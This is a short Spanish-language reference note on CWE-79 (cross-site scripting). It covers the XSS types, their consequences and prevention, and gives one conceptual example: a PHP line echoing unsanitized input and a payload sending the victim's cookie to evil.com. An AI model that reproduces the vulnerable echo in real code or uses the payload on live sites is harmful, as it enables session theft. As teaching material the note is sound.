**CWE-79** (_Improper Neutralization of Input During Web Page Generation_) es la inyección de código malicioso en un link o requerimiento que termina siendo **ejecutado por el navegador de la víctima**.

## Descripción

La aplicación web incluye input del usuario en la respuesta HTML sin sanitizarlo correctamente. El navegador de la víctima interpreta ese input como código JavaScript y lo ejecuta en el contexto del sitio vulnerable.

## Tipos de XSS

| Tipo | Descripción |
|---|---|
| **Reflected** | El payload se incluye en la URL y se refleja en la respuesta inmediata |
| **Stored** | El payload se almacena en la base de datos y se sirve a otros usuarios |
| **DOM-based** | El payload se ejecuta en el cliente mediante manipulación del DOM |

## Consecuencias

- Robo de cookies de sesión → secuestro de sesión del usuario.
- Redireccionamiento a sitios maliciosos.
- Keylogging y captura de credenciales.
- Defacement de la página.

## Ejemplo conceptual

```html
<!-- Input del usuario sin sanitizar incluido en el HTML -->
<p>Hola, <?= $_GET['nombre'] ?></p>

<!-- Payload del atacante en la URL -->
?nombre=<script>document.location='http://evil.com/?c='+document.cookie</script>
```

## Prevención

- Escapar correctamente el output según el contexto (HTML, JS, CSS, URL).
- Implementar Content Security Policy (CSP).
- Sanitizar el input del usuario.

## Referencia

https://cwe.mitre.org/data/definitions/79.html
